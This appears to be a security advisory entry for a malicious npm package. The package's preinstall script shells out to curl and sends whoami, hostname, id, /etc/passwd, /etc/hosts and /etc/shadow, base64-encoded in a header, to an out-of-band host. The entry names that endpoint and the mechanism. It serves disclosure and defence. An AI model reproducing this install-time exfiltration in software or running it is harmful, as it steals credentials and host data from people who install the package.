summary: preinstall exfiltrates host identity and /etc/passwd, /etc/shadow to attacker OAST endpoint
details: The package's preinstall script runs `node index.js`, which shells out via child_process/exec to a curl command that POSTs installer data to http://5f8a1ed70fb7761d678agw9bucryyyyyb.oast.site/verify-cli/$(whoami)/$(hostname)/. The exfiltrated payload, base64-encoded and placed in the User-Agent header, includes the output of `whoami`, `hostname`, `id`, the contents of /etc/passwd and /etc/hosts, and /etc/shadow when readable. The traffic is plaintext HTTP to a Burp Collaborator-style out-of-band host, and the behavior fires automatically on `npm install`.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
